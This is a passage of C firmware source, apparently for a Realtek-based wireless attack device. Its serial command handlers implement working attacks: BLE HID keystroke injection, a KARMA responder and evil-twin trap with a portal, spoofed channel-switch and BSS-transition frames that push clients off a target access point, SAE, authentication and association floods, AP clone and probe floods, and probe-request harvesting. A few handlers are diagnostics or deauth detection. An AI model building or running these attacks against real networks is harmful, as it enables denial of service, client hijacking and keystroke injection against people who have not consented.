              snprintf(l2, sizeof(l2), "GATT:C|%s", cl->getCharacteristicUuid(si, ci));
              Serial.println(l2); Serial1.println(l2);
            }
          }
          conn->disconnect();
          Serial.println("GATT:done"); Serial1.println("GATT:done");
        }else{
          Serial.println("GATT:connect-failed"); Serial1.println("GATT:connect-failed");
        }
        BLE.end();
      }
    }else if(readString.substring(0,6)=="BADBLE"){
      // P11: BLE HID keyboard injection. Args: BADBLE [secs] [hex-payload]
      // Advertises as a HID keyboard; if a host connects, types the payload. LOW success:
      // modern hosts require pairing/confirmation and reject unauth HID peripherals.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int secs = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 30;
      if(secs < 1 || secs > 120) secs = 30;
      String phex = (s2 > 0) ? readString.substring(s2+1, readString.length()-1) : String("");
      char txt[96]; int tn = 0;
      for(int i = 0; phex[i] && phex[i+1] && tn < 95; i += 2) {
        int hi = hexnib(phex[i]), lo = hexnib(phex[i+1]);
        if(hi < 0 || lo < 0) break;
        txt[tn++] = (char)((hi << 4) | lo);
      }
      txt[tn] = 0;
      if(tn == 0) strcpy(txt, "delfyRTL says hi\n");
      ble_hidadv.clear();
      ble_hidadv.addFlags();
      ble_hidadv.addCompleteName("DELFY-KB");
      ble_hidadv.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
      ble_hidadv.addCompleteServices(BLEUUID(HID_SERVICE_UUID));
      BLEHIDDev.init();
      BLE.init();
      BLE.configAdvert()->setAdvData(ble_hidadv);
      BLE.setDeviceName("DELFY-KB");
      BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
      BLE.configSecurity()->setPairable(true);
      BLE.configSecurity()->setAuthFlags(GAP_AUTHEN_BIT_BONDING_FLAG);
      BLE.configServer(3);
      BLE.addService(BLEHIDDev.hidService());
      BLE.addService(BLEHIDDev.battService());
      BLE.addService(BLEHIDDev.devInfoService());
      BLE.beginPeripheral();
      Serial.println("BADBLE:on"); Serial1.println("BADBLE:on");
      uint32_t t0 = millis();
      bool typed = false;
      while (millis() - t0 < (uint32_t)secs * 1000u) {
        if (BLE.connected() && !typed) {
          ble_kbd.keyReleaseAll();
          delay(300);
          ble_kbd.keySequence(txt, 20);
          ble_kbd.keyReleaseAll();
          typed = true;
          Serial.println("BADBLE:typed"); Serial1.println("BADBLE:typed");
        }
        delay(200);
      }
      BLE.end();
      Serial.println("BADBLE:off"); Serial1.println("BADBLE:off");
    }else if(readString.substring(0,3)=="HOP"){
      // P1: channel hop. Args: HOP <interval_ms>  (0 = stop). Cycles 1..13.
      int ms = readString.substring(4, readString.length()-1).toInt();
      if (ms <= 0) {
        hopping = false;
      } else {
        hop_interval_ms = (ms < 100) ? 100 : ((ms > 5000) ? 5000 : (uint32_t)ms);
        hopping = true;
      }
      String r = String("HOP:") + (hopping ? "on " : "off ") + String(hopping ? (unsigned)hop_interval_ms : 0u);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="SNIFFDEAUTH"){
      // A5: count other people's deauth/disassoc frames (IDS).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      ids_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_ids_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      ids_stream(ch);
    }else if(readString.substring(0,10)=="PROBESNIFF"){
      // A1: harvest probe requests on <chan> for [secs] -> the PNL of nearby devices.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      probe_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_probe_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      probe_stream(ch);
    }else if(readString.substring(0,8)=="RECFETCH"){
      // F5: dump the recorded actions as REC:<line>, then RECDONE:<n> so the app can save them.
      for(int i = 0; i < rec_n; i++) {
        String r = String("REC:");
        r += rec_lines[i];
        Serial.println(r); Serial1.println(r);
      }
      String d = "RECDONE:" + String((unsigned)rec_n);
      Serial.println(d); Serial1.println(d);
    }else if(readString.substring(0,8)=="RECCLEAR"){
      rec_n = 0;
      Serial.println("RECCLEAR:ok"); Serial1.println("RECCLEAR:ok");
    }else if(readString.substring(0,3)=="REC" && readString.charAt(3)==' '){
      // F5: REC <0|1> - record the commands the app sends. The charAt guard keeps RECFETCH and
      // RECCLEAR out of here (a bare "REC" prefix would otherwise swallow them).
      int s1 = readString.indexOf(' ');
      int on = (s1 > 0) ? readString.substring(s1+1, readString.length()-1).toInt() : 1;
      rec_on = (on != 0);
      if(rec_on) rec_n = 0;      // a fresh recording always starts clean
      String r = String("RECCTL:") + (rec_on ? "on" : "off") + " n=" + String((unsigned)rec_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="TRAPSTAT"){
      // C1: read-only status (a bare "TRAP" means "trap on", so a query needs its own name).
      String r = String("TRAPSTAT:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
                 " ap=" + String(apActive ? trap_ssid : "-") +
                 " portal=" + String(portal) +
                 " seen=" + String((unsigned)karma_seen_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,4)=="TRAP" && readString.charAt(4)==' '){
      // C1: KARMA -> Trap. Args: TRAP <0|1> [chan]. Like KARMA but the first requested SSID is
      // cloned as a real softAP (portal served), so the client can actually associate.
      // The charAt guard keeps "TRAPSTAT"/"TRAPCTL" out of here - without it a status query would
      // re-arm the trap and destroy the AP that is already up.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
      int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
      if(ch >= 1 && ch <= 165) karma_chan = ch;
      trap_on = (on != 0);
      trap_armed = true;
      trap_ssid[0] = 0;
      karma_pending = false;
      if(trap_on) {
        karma_on = true;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, karma_chan);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
      } else {
        karma_on = false;
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
        if(apActive) { destroyAP(); apActive = false; }
      }
      String r = String("TRAPCTL:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
                 " ap=" + String(apActive ? trap_ssid : "-");
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,9)=="KARMALIST"){
      // B1: report the SSIDs the responder has seen, so the host can show them live.
      // NOTE: this must be tested BEFORE the "KARMA" handler below - "KARMALIST" starts with
      // "KARMA", so otherwise it gets swallowed and re-enables the responder on every poll.
      String r = "KARMALIST:" + String((unsigned)karma_seen_n);
      for(int i = 0; i < karma_seen_n; i++) r += String("|") + karma_seen[i];
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,5)=="KARMA"){
      // B1: KARMA responder. Args: KARMA <0|1> [chan]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
      int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
      if(ch >= 1 && ch <= 165) karma_chan = ch;
      karma_on = (on != 0);
      karma_pending = false;
      if(karma_on) {
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, karma_chan);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_karma_cb, 0);
      } else {
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      }
      String r = String("KARMA:") + (karma_on ? "on" : "off") + " ch=" + String(karma_chan) +
                 " seen=" + String((unsigned)karma_seen_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,9)=="BEACONOFF"){
      // Stop every beacon/SSID-flood mode. Nothing else in the firmware turned all of them off
      // (SCAN cleared randomSSID/rickroll, STOP only ghostSpam), so a running flood could not be
      // stopped from the app at all.
      randomSSID = false; rickroll = false; ghostSpam = false; ssid = "";
      String r = "BEACONOFF:ok";
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,5)=="TXRAW"){
      // DIAG: TXRAW <hexbytes> -> push an arbitrary 802.11 frame through wifi_tx_raw_frame.
      // Lets us bisect live (no rebuild) which byte in a beacon-ish frame makes the SDK spin.
      int s1 = readString.indexOf(' ');
      String hex = (s1 > 0) ? readString.substring(s1+1, readString.length()-1) : String("");
      wext_set_channel(WLAN0_NAME, 6);   // DIAG: raw TX only completes on a tuned channel
      int n = tx_raw_hex(hex.c_str());
      String r = "TXRAW:" + String((unsigned)n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="CHANSET"){
      // Which channels does this build's channel set actually contain?
      // wext_set_channel() accepts a 5 GHz number and wext_get_channel() reads it back, but a raw TX
      // on a channel the set does not contain never completes - the SDK spins inside its TX path and
      // the board goes silent. The SDK's own wifi_get_ch_from_channel_set() is not in this build's
      // archive (link error), so the same private ioctl is issued directly; wifi_get_channel_plan()
      // says which plan is being consulted. No TX here: safe on any channel.
      uint8_t plan = 0xFF;
      wifi_get_channel_plan(&plan);
      int ch = readString.substring(8).toInt();
      if(ch < 1 || ch > 196) ch = 1;
      char q[24];
      snprintf(q, sizeof(q), "get_ch_from_set %x", ch);   // the SDK formats this in hex
      int in_set = wext_private_command_with_retval(WLAN0_NAME, q, q, sizeof(q));
      String r = String("CHANSET:req=") + String(ch) + " plan=0x" + String((unsigned)plan, HEX) +
                 " in_set=" + String(in_set) + " idx=" + String(q) +
                 " band=" + String(wifi_get_band_type());
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="CHANPLAN"){
      // CHANPLAN <n> -> wifi_change_channel_plan() (driver call, present in the archive) then read
      // the plan back. No TX: this is how we try to make a 5 GHz channel belong to the set.
      int want = readString.substring(9).toInt();
      uint8_t before = 0xFF, after = 0xFF;
      wifi_get_channel_plan(&before);
      int rc = wifi_change_channel_plan((uint8_t)want);
      delay(50);
      wifi_get_channel_plan(&after);
      String r = String("CHANPLAN:want=0x") + String((unsigned)want, HEX) + " rc=" + String(rc) +
                 " before=0x" + String((unsigned)before, HEX) + " after=0x" + String((unsigned)after, HEX);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="TX5PROBE"){
      // Deliberate 5 GHz experiment, deliberately NOT behind tx_raw_chan_ok(): the whole point is to
      // find out whether a raw TX on a 5 GHz channel can ever complete. It sends ONE beacon. If the
      // line below comes back, 5 GHz raw TX works. If the board goes silent, it does not - and that
      // silence is the result (recover with a flash, which also resets the board).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 36;
      int cnt = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 1;
      if(ch < 36 || ch > 165) ch = 36;
      if(cnt < 1 || cnt > 200) cnt = 1;
      if(apActive) destroyAP();
      uint8_t src[6] = {0x00,0xE0,0x4C,0x11,0x22,0x33};
      for(int i = 0; i < cnt; i++) {
        wext_set_channel(WLAN0_NAME, ch);   // tune immediately before every frame, as the floods do
        tx_beacon_raw(src, TX_BCAST, "DELFY5P", 0x80, ch);
        if((i & 15) == 15) delay(2);
      }
      String r = String("TX5PROBE:ok ch=") + String(ch) + " n=" + String(cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,4)=="CHAN"){
      // F3 diag: CHAN <n> -> tune the radio and report what it actually did.
      // Everything that transmits (deauth/CSA/BTM/beacon) only completes when the radio is tuned
      // to the target's channel, and wext_set_channel() silently ignores a channel the current
      // band table does not contain. So "does 5 GHz injection work?" cannot be answered from the
      // FAP side - the channel has to be read back, together with the band the SDK thinks it is
      // on. got != req means the request was refused (5 GHz not available on this part/band table).
      int ch = readString.substring(5).toInt();
      if(ch < 1 || ch > 196) ch = 1;
      if(apActive) destroyAP();
      int setres = wext_set_channel(WLAN0_NAME, ch);
      delay(50);
      uint8_t got = 0;
      int getres = wext_get_channel(WLAN0_NAME, &got);
      // NOTE: do not read "cap=" as the current band. wifi_get_band_type() combines the channel
      // plan with the chip's capability check and never looks at the tuned channel, so a constant
      // value is expected. 2 = WL_BAND_2_4G_5G_BOTH (dual-band capable), 0 = 2.4G only, 1 = 5G
      // only, 3 = the channel plan and the chip disagree. Real band switching happens lower down
      // in the driver (set_channel_bwmode -> phy_switch_wireless_band_8721d), so the only proof
      // that 5 GHz actually transmits is a receiver - see tools/mac_wifiscan.swift.
      String r = String("CHAN:req=") + String(ch) + " got=" + String((int)got) +
                 " set=" + String(setres) + " get=" + String(getres) +
                 " cap=" + String(wifi_get_band_type());
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="TXBEACON"){
      // DIAG (B6 fix): TXBEACON <typehex> <count> [ssid] -> raw beacon frames with a settable
      // frame-control byte, so we can prove which frame type/the old SDK beacon path was hanging.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      int ftype = (s1 > 0) ? (int)strtol(readString.substring(s1+1, s2>0?s2:readString.length()-1).c_str(), NULL, 16) : 0x80;
      int cnt = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 1;
      String ssid = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1) : String("DIAG");
      int chan = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 5;
      if(cnt < 1 || cnt > 40) cnt = 1;
      uint8_t src[6] = {0x00,0xE0,0x4C,0x01,0x02,0x03};
      for(int i=0;i<cnt;i++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), (uint8_t)ftype, chan);
      String r = "TXBEACON:" + String(ftype, HEX) + ":" + String((unsigned)cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="BTMSTAS"){
      // B3b: unicast BTM request to every station from the last STASCAN. Same argument as
      // CSASTAS: a real AP steers clients with unicast management action frames, broadcast ones
      // are widely ignored.
      // Args: BTMSTAS <bssid-12hex> <ap-chan> <new-chan> [frames]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 1;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: BTMSTAS needs a 12-hex bssid"); Serial1.println("ERROR: BTMSTAS needs a 12-hex bssid");
      }else if(sta_n == 0) {
        Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(newch < 1 || newch > 165) newch = 1;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, apch);
        uint8_t sent = 0;
        for(uint8_t i = 0; i < sta_n && i < STA_MAX; i++) {
          for(int x = 0; x < 3; x++) btm_send_frame(bssid, (uint8_t)newch, sta_list[i].mac);
          sent++;
        }
        String r = String("BTMSTAS:") + String((unsigned)sent) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,3)=="BTM" && readString.charAt(3)==' '){
      // B3: BTM <bssid-12hex> <ap-chan> <new-chan> [frames]
      // Spoofs BSS transition requests from the target AP; a client that supports 802.11v tries
      // to move to the phantom candidate and leaves the AP without a single deauth frame.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 1;
      int frames = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 12;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: BTM needs a 12-hex bssid"); Serial1.println("ERROR: BTM needs a 12-hex bssid");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(newch < 1 || newch > 165) newch = 1;
        if(frames < 1 || frames > 60) frames = 12;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, apch);
        for(int i = 0; i < frames; i++) btm_send_frame(bssid, (uint8_t)newch, TX_BCAST);
        String r = String("BTM:") + String((unsigned)frames) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,8)=="SAEFLOOD"){
      // B4: SAEFLOOD <bssid-12hex> <chan> [count]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int count = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 64;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: SAEFLOOD needs a 12-hex bssid"); Serial1.println("ERROR: SAEFLOOD needs a 12-hex bssid");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(count < 1 || count > 500) count = 64;
        if(!tx_raw_chan_ok(apch, "SAEFLOOD")) {
          // refused above; nothing else to do
        }else{
        if(apActive) destroyAP();
        for(int i = 0; i < count; i++) {
          flood_mac_rand();                 // a different client per commit: no state to reuse
          wext_set_channel(WLAN0_NAME, apch);   // tune immediately before every TX: the SDK hangs
          sae_send_commit(bssid, flood_sta);    // inside the TX path if the radio is not tuned
          if((i & 15) == 15) delay(2);      // let the WiFi task breathe every 16 frames
        }
        }
        String r = String("SAEFLOOD:") + String((unsigned)count) + " ch=" + String(apch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,5)=="AUTHF" || readString.substring(0,5)=="ASSOC"){
      // B5: AUTHFLOOD <bssid-12hex> <chan> [count]
      //     ASSOCFLOOD <bssid-12hex> <chan> [count]   (auth + assoc + sleep per random MAC)
      bool with_assoc = (readString.substring(0,5) == "ASSOC");
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int count = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 64;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        String e = String("ERROR: ") + (with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD") + " needs a 12-hex bssid";
        Serial.println(e); Serial1.println(e);
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(count < 1 || count > 500) count = 64;
        if(!tx_raw_chan_ok(apch, with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD")) {
        }else{
        if(apActive) destroyAP();
        String ssid = with_assoc ? flood_ssid_for(bssid) : String("");
        for(int i = 0; i < count; i++) {
          flood_mac_rand();
          wext_set_channel(WLAN0_NAME, apch);
          flood_tx_auth(bssid, flood_sta);
          if(with_assoc) {
            flood_tx_assoc(bssid, flood_sta, ssid.c_str());
            flood_tx_sleep(bssid, flood_sta);
          }
          if((i & 15) == 15) delay(2);   // let the WiFi task breathe every 16 frames
        }
        }
        String r = (with_assoc ? "ASSOCFLOOD:" : "AUTHFLOOD:") + String((unsigned)count) +
                   " ch=" + String(apch) + (with_assoc ? (" ssid=" + ssid) : "");
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,7)=="CSASTAS"){
      // B2b: unicast CSA to every station we know about (from the last STASCAN). That is what a
      // real AP does and what clients actually obey - broadcast CSA action frames are widely
      // ignored (measured: broadcast dropped some clients, Apple/ax ignored it entirely).
      // Args: CSASTAS <bssid-12hex> <ap-chan> <new-chan> [frames]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 1;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: CSASTAS needs a 12-hex bssid"); Serial1.println("ERROR: CSASTAS needs a 12-hex bssid");
      }else if(sta_n == 0) {
        Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(newch < 1 || newch > 165) newch = 1;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, apch);
        uint8_t sent = 0;
        for(uint8_t i = 0; i < sta_n && i < STA_MAX; i++) {
          for(int x = 0; x < 3; x++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, sta_list[i].mac);
          sent++;
        }
        String r = String("CSASTAS:") + String((unsigned)sent) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,3)=="CSA" && readString.charAt(3)==' '){
      // B2: CSA <bssid-12hex> <ap-chan> <new-chan> [frames]
      // Spoofs channel-switch announcements from the target AP; its clients hop channels (or drop)
      // with no deauth at all. Unprotected-CSA-only: PMF/WPA3 clients ignore it.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 1;
      int frames = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 12;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: CSA needs a 12-hex bssid"); Serial1.println("ERROR: CSA needs a 12-hex bssid");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(newch < 1 || newch > 165) newch = 1;
        if(frames < 1 || frames > 60) frames = 12;
        if(apActive) destroyAP();                  // no softAP fighting us on another channel
        wext_set_channel(WLAN0_NAME, apch);        // we must transmit on the target AP's channel
        for(int i = 0; i < frames; i++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, TX_BCAST);
        String r = String("CSA:") + String((unsigned)frames) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,7)=="APCLONE"){
      // B6: clone <ssid> across [cnt] random locally-administered BSSIDs on [chan] (AP clone spam).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String ssid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int cnt = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 8;
      int chan = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
      if(cnt < 1 || cnt > 40) cnt = 8;
      if(ssid.length() == 0){
        Serial.println("ERROR: APCLONE needs <ssid> [count] [chan]"); Serial1.println("ERROR: APCLONE needs <ssid> [count] [chan]");
      }else{
        if(apActive) destroyAP();
        for(int i=0;i<cnt;i++){
          uint8_t src[6];
          for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
          src[0] = (src[0] & 0xFC) | 0x02;      // locally administered, unicast
          for(int x=0;x<3;x++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), 0x80, chan);
        }
        String r = "APCLONE:" + String((unsigned)cnt) + "|" + ssid;
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,10)=="PROBEFLOOD"){
      // B7: emit probe requests for <ssid|*> on <chan> from [cnt] random MACs.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String ssid = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("*");
      int cnt = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 24;
      if(ch < 1 || ch > 165) ch = 6;
      if(cnt < 1 || cnt > 200) cnt = 24;
      const char* s = (ssid == "*") ? NULL : ssid.c_str();
      if(apActive) destroyAP();
      wext_set_channel(WLAN0_NAME, ch);
      for(int i=0;i<cnt;i++){
        uint8_t src[6];
        for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
        src[0] = (src[0] & 0xFC) | 0x02;
        tx_probe_req(src, s);
      }
      String r = "PROBEFLOOD:" + String((unsigned)cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="PMFSCAN"){
      // P2: classify nearby APs (PMF-required / SAE / #AKMs) from the beacon RSN IE.
      // Args: PMFSCAN <chan> [secs]  (default 5s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 5;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 5;
      if(apActive) destroyAP();   // monitor scan needs the softAP torn down
      pmf_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
